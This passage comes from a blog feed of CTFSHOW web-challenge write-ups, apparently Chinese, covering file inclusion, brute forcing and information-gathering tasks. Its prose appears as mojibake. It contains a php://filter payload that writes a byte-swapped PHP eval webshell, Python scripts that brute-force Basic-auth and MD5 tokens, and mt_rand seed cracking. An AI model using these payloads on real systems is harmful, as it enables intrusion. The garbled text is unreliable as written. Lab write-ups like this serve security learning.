class="line">convert.iconv.ï¼šä¸€ç§è¿‡æ»¤å™¨ï¼Œå’Œä½¿ç”¨<span class="title function_ invoke__">iconv</span>()å‡½æ•°å¤„ç†æµæ•°æ®æœ‰ç­‰åŒä½œç”¨</span><br><span class="line"><span class="title function_ invoke__">iconv</span> ( <span class="keyword">string</span> <span class="variable">$in_charset</span> , <span class="keyword">string</span> <span class="variable">$out_charset</span> , <span class="keyword">string</span> <span class="variable">$str</span> )ï¼šå°†å­—ç¬¦ä¸² <span class="variable">$str</span> ä»in_charsetç¼–ç è½¬æ¢åˆ° <span class="variable">$out_charset</span></span><br><span class="line">è¿™é‡Œå¼•å…¥usc-<span class="number">2</span>çš„æ¦‚å¿µï¼Œä½œç”¨æ˜¯å¯¹ç›®æ ‡å­—ç¬¦ä¸²æ¯ä¸¤ä½è¿›è¡Œä¸€åè½¬ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæ˜¯ä¸¤ä½æ‰€ä»¥å­—ç¬¦ä¸²éœ€è¦ä¿æŒåœ¨å¶æ•°ä½ä¸Š</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ban php æ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php </span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW çˆ†ç ´</title>
      <link href="/2023/08/09/CTFSHOW%20%E7%88%86%E7%A0%B4/"/>
      <url>/2023/08/09/CTFSHOW%20%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web21-tomcat"><a href="#web21-tomcat" class="headerlink" title="web21(tomcat)"></a>web21(tomcat)</h1><p>æ‰“å¼€åå‘ç°æ˜¯å¸¸è§„çˆ†ç ´tomcatï¼Œæ­£å¸¸å†™è„šæœ¬çˆ†ç ´å°±è¡Œ</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/baopo.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1f0f98a8-347f-4c6b-bef6-1fdf6f595916.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetPayload</span>(<span class="params">passwd</span>):</span><br><span class="line">    Payload = <span class="string">&quot;admin:&quot;</span>+passwd</span><br><span class="line">    <span class="keyword">return</span> (base64.b64encode(Payload.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetFlag</span>(<span class="params">url,Payload</span>):</span><br><span class="line">    Payload_Last = <span class="string">&quot;Basic &quot;</span>+Payload</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Payload_Last</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(base64.b64decode(Payload).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        passwd = line.split()[-<span class="number">1</span>]</span><br><span class="line">        Payload = GetPayload(passwd)</span><br><span class="line">        GetFlag(url,Payload)</span><br></pre></td></tr></table></figure><h1 id="web22-å­åŸŸå"><a href="#web22-å­åŸŸå" class="headerlink" title="web22(å­åŸŸå)"></a>web22(å­åŸŸå)</h1><blockquote><p>åŸŸåå¤±æ•ˆäº†</p></blockquote><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/baopo_01.png" alt=""></p><h1 id="web23-MD5"><a href="#web23-MD5" class="headerlink" title="web23(MD5)"></a>web23(MD5)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¦‚æœmd5åŠ å¯†åçš„ç¬¬ä¸€ä½=ç¬¬14ä½=ç¬¬17ä½ and  ç¬¬1ä½+ç¬¬14ä½+ç¬¬17ä½é™¤ä»¥ç¬¬1ä½ç­‰äºç¬¬31ä½å°±è¾“å‡ºflag</span></span><br></pre></td></tr></table></figure><p>å†™çˆ†ç ´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        url=<span class="string">&quot;http://23bb7e6a-3533-4bc7-b6f8-f5108b9ac2c0.challenge.ctf.show/?token=&quot;</span>+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)</span><br><span class="line">        req=requests.get(url=url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(req)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="web24-ä¼ªéšæœºæ•°"><a href="#web24-ä¼ªéšæœºæ•°" class="headerlink" title="web24(ä¼ªéšæœºæ•°)"></a>web24(ä¼ªéšæœºæ•°)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>mt_srand() //æ’­ç§ Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨ã€‚<br>mt_rand() //ç”Ÿæˆéšæœºæ•°<br>ç®€å•æ¥è¯´mt_scrand()é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœºæ•°<br>å½“ç§å­ä¸å˜æ—¶ï¼Œå®é™…ä¸Šç”Ÿæˆçš„éšæœºæ•°æ˜¯å›ºå®šçš„ã€‚è€Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°æ¼æ´</p></blockquote><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 1155388967</span></span><br></pre></td></tr></table></figure><p>ä¼ å‚ï¼Œå¾—åˆ°flag</p><h1 id="web25-ä¼ªéšæœºæ•°plus"><a href="#web25-ä¼ªéšæœºæ•°plus" class="headerlink" title="web25(ä¼ªéšæœºæ•°plus)"></a>web25(ä¼ªéšæœºæ•°plus)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬å‘æœåŠ¡å™¨ä¼ è¾“ä¸€ä¸ªå‚æ•°<code>r</code>,ç¨‹åºå°†flagç”¨md5åŠ å¯†åï¼Œå–å‰8ä½ä½œä¸ºç§å­ï¼Œç”¨<code>mt_srand()</code>å‡½æ•°ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œç„¶åå°†ä¸¤è€…ç›¸å‡ï¼Œå°†ç»“æœèµ‹å€¼ç»™<code>$rand</code>ï¼Œå¦‚æœ<code>$rand</code>ç­‰äº0ï¼Œé‚£ä¹ˆæ£€æŸ¥<code>cookie</code>ä¸­çš„<code>token</code>æ˜¯å¦ç­‰äºä¸¤ä¸ª<code>mt_srand()</code> çš„å’Œï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¾“å‡ºflagã€‚å¦‚æœ<code>$rand</code>ä¸ç­‰äº0ï¼Œåˆ™è¾“å‡º$rand</p></blockquote><p>å› ä¸º<code>mt_srand()</code>çš„ç§å­æ˜¯ç”¨<code>flag</code>ç”Ÿæˆçš„ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥é¢„æµ‹<code>mt_srand()</code>çš„è¾“å‡º</p><p>å¯ä½¿ç”¨<code>php_mt_seed</code>å·¥å…·è¿›è¡Œç§å­çˆ†ç ´</p><ul><li><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a></li></ul><p>å…ˆå‘æœåŠ¡å™¨ä¼ è¾“r=0ï¼Œå¾—åˆ°ç¬¬ä¸€ä¸ªmt_srand()çš„å€¼ï¼š-1072139268ï¼ˆéšæœºç”Ÿæˆï¼‰</p><p>åœ¨kaliä¸­ä½¿ç”¨php_mt_seedå·¥å…·ï¼Œé¦–å…ˆè¾“å…¥makeåå°±å¯æ­£å¸¸ä½¿ç”¨</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/25.png" alt=""></p><p>å†é€šè¿‡æŠ“åŒ…å·¥å…·æ‰¾åˆ°phpç‰ˆæœ¬</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/25_01.png" alt=""></p><p>å‘ç°çˆ†ç ´å¤„çš„phpç‰ˆæœ¬7.1.0+æœ‰å¾ˆå¤šä¸ªï¼Œå°†æ¯ä¸ªç§å­éƒ½è®°å½•ä¸‹æ¥</p><blockquote><p>490065111</p><p>490266778</p><p>2212201099</p><p>2869436065</p><p>3656704041</p></blockquote><p>ç”¨è¿™ä¸ªç§å­å†™ä¸€ä¸ªphpæµ‹è¯•è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">490065111</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;===&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†æ¯ä¸ªç§å­ç”Ÿæˆçš„æ•°æ®éƒ½è®°å½•ä¸‹æ¥</p><blockquote><p>1072139268===1800873081</p><p>1072139268===3379721082</p><p>1072139268===1603006468</p><p>1072139268===3077457061</p><p>1072139268===2163793481</p></blockquote><p>ç¬¬ä¸€ä¸ªæ•°æ®æ˜¯<code>r</code>çš„å€¼ï¼Œç¬¬äºŒä¸ªæ•°æ®æ˜¯<code>Cookie</code>çš„å€¼ï¼Œè¿›è¡Œå®éªŒ</p><p>åœ¨ç¬¬å››ä¸ªçš„æ—¶å€™å¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/25_02.png" alt=""></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26(?)"></a>web26(?)</h1><p>emmmï¼Œæœ‰ç‚¹æ²¡çœ‹æ‡‚ï¼Œåœ¨å®‰è£…ç•Œé¢æŠ“äº†ä¸ªåŒ…ï¼Œéšæ‰‹ä¸€å‘ï¼Œå°±å¾—åˆ°äº†flag</p><p><img src="" alt=""><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/26.png" alt="26"></p><h1 id="web27-æ—¥æœŸ"><a href="#web27-æ—¥æœŸ" class="headerlink" title="web27(æ—¥æœŸ)"></a>web27(æ—¥æœŸ)</h1><p>åœ¨å½•å–åå•ä¸­ï¼Œå‘ç°å¯èƒ½æœ‰ç”¨çš„ä¿¡æ¯</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27.png" alt=""></p><p>åœ¨å­¦ç±ç™»é™†ç•Œé¢å‘ç°å¯ä»¥è¿›è¡Œçˆ†ç ´çš„åœ°æ–¹</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_01.png" alt=""></p><p>å°è¯•çˆ†ç ´ï¼Œå…ˆæ‰“æ–­ç‚¹</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_02.png" alt=""></p><p>è®¾ç½®Payload</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_03.png" alt=""></p><p>å¾—åˆ°ç»“æœ</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_04.png" alt=""></p><p>ç™»é™†æˆåŠŸï¼Œè·å¾—ä¿¡æ¯</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_05.png" alt=""></p><p>æ‹¿å»è§£ç ä¸€ä¸‹</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_06.png" alt=""></p><p>ç™»å½•ï¼Œè·å¾—flag</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/27_07.png" alt=""></p><h1 id="web28-ç›®å½•"><a href="#web28-ç›®å½•" class="headerlink" title="web28(ç›®å½•)"></a>web28(ç›®å½•)</h1><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28.png" alt=""></p><p>çŒœæµ‹ä¸ºçˆ†ç ´ç›®å½•ï¼Œå°†2.txtåˆ æ‰è¿›è¡Œçˆ†ç ´</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_01.png" alt=""></p><p>è®¾ç½®Payloadï¼Œå°†ä¸¤ä¸ªæ•°å€¼éƒ½è®¾ç½®1-100</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_02.png" alt=""></p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_03.png" alt=""></p><p>çˆ†ç ´æˆåŠŸï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_04.png" alt=""></p><p><img src="/img/CTFSHOW-%E7%88%86%E7%A0%B4/28_05.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW ä¿¡æ¯æœé›†</title>
      <link href="/2023/08/09/CTFSHOW%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2023/08/09/CTFSHOW%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web1-æºç "><a href="#web1-æºç " class="headerlink" title="web1(æºç )"></a>web1(æºç )</h1><p>é¡µé¢æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.png" alt=""></p><h1 id="web2-js"><a href="#web2-js" class="headerlink" title="web2(js)"></a>web2(js)</h1><p>åˆ©ç”¨æ’ä»¶ç¦ç”¨jsï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2.png" alt=""></p><h1 id="web3-BurpSuite"><a href="#web3-BurpSuite" class="headerlink" title="web3(BurpSuite)"></a>web3(BurpSuite)</h1><p>æ‰“å¼€é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3.png" alt=""></p><p>æ ¹æ®æç¤ºï¼Œåˆ©ç”¨burpsuiteæŠ“åŒ…å¹¶é‡æ–°å‘é€ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3_01.png" alt=""></p><h1 id="web4-robots-txt"><a href="#web4-robots-txt" class="headerlink" title="web4(robots.txt)"></a>web4(robots.txt)</h1><p>æ‰“å¼€é¡µé¢ï¼Œå‘ç°æ²¡ä»€ä¹ˆæç¤ºï¼Œæºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ï¼Œæ ¹æ®æç¤ºï¼Œè®¿é—®<code>robots.txt</code></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/4.png" alt=""></p><p>å‘ç°flagæ–‡ä»¶ï¼Œè®¿é—®ï¼ŒæˆåŠŸå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/4_01.png" alt=""></p><h1 id="web5-phpsæºç æ³„éœ²"><a href="#web5-phpsæºç æ³„éœ²" class="headerlink" title="web5(phpsæºç æ³„éœ²)"></a>web5(phpsæºç æ³„éœ²)</h1><p>å¯ä»¥æ‹¿æ‰«ç›®å½•è½¯ä»¶è¿›è¡Œæ‰«æ</p><p>è®¿é—®<code>index.phps</code>ä¸‹è½½æºç ï¼ŒæŸ¥çœ‹å‘ç°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/5.png" alt=""></p><h1 id="web6-www-zip"><a href="#web6-www-zip" class="headerlink" title="web6(www.zip)"></a>web6(www.zip)</h1><p>æ­£å¸¸æ‰«ç›®å½•ï¼Œå‘ç°æ–‡ä»¶</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6.png" alt=""></p><p>ä¸‹è½½ï¼ŒæŸ¥çœ‹</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6_01.png" alt=""></p><p>è®¿é—®<code>fl000g.txt</code>æ–‡ä»¶å¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6_02.png" alt=""></p><h1 id="web7-git"><a href="#web7-git" class="headerlink" title="web7(.git)"></a>web7(.git)</h1><p>ä¾æ—§æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰«ç›®å½•</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/7.png" alt=""></p><p>è®¿é—®<code>.git</code>ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/7_01.png" alt=""></p><h1 id="web8-svn"><a href="#web8-svn" class="headerlink" title="web8(.svn)"></a>web8(.svn)</h1><p>æ‰«ç›®å½•ï¼Œå‘ç°<code>.svn</code>æ–‡ä»¶ï¼Œå¯çŸ¥ä¸ºSVNæ³„éœ²</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/8.png" alt=""></p><p>è®¿é—®ä¸€ä¸‹<code>.svn</code>ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/8_01.png" alt=""></p><h1 id="web9-vimå¤‡ä»½æ–‡ä»¶"><a href="#web9-vimå¤‡ä»½æ–‡ä»¶" class="headerlink" title="web9(vimå¤‡ä»½æ–‡ä»¶)"></a>web9(vimå¤‡ä»½æ–‡ä»¶)</h1><p>æ‰«ç›®å½•ã€å‘ç°æ²¡ä»€ä¹ˆä¿¡æ¯</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/9.png" alt=""></p><p>æ ¹æ®æç¤ºï¼Œå‘ç°ä¸ºvimå¤‡ä»½æ–‡ä»¶</p><p>å°è¯•è®¿é—®<code>index.php.swp</code>ï¼Œæ–‡ä»¶ä¸‹è½½æˆåŠŸï¼ŒæŸ¥çœ‹ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/9_01.png" alt=""></p><h1 id="web10-Cookie"><a href="#web10-Cookie" class="headerlink" title="web10(Cookie)"></a>web10(Cookie)</h1><p>æ ¹æ®æç¤ºï¼ŒçŒœæµ‹Cookieå¯èƒ½æœ‰ä¸œè¥¿ï¼ŒæŠ“åŒ…è¯•è¯•ï¼Œå‘ç°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/10.png" alt=""></p><h1 id="web11-åŸŸåè§£æ"><a href="#web11-åŸŸåè§£æ" class="headerlink" title="web11(åŸŸåè§£æ)"></a>web11(åŸŸåè§£æ)</h1><p> æ ¹æ®æç¤ºï¼Œå‘ç°éœ€è¦åŸŸåè§£æ</p><p><a href="http://dbcha.com/">åŸŸåè§£ææŸ¥è¯¢</a></p><p>è®¾ç½®ç›¸åº”è®°å½•ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/11.png" alt=""></p><h1 id="web12"><a href="#web12" class="headerlink" title="web12()"></a>web12()</h1><p>æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå°è¯•è®¿é—®ä¸€ä¸‹<code>robots.txt</code>ï¼Œå‘ç°å­˜åœ¨<code>/admin</code>ç›®å½•</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12.png" alt=""></p><p>è®¿é—®å‘ç°éœ€è¦ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12_01.png" alt=""></p><p>æ 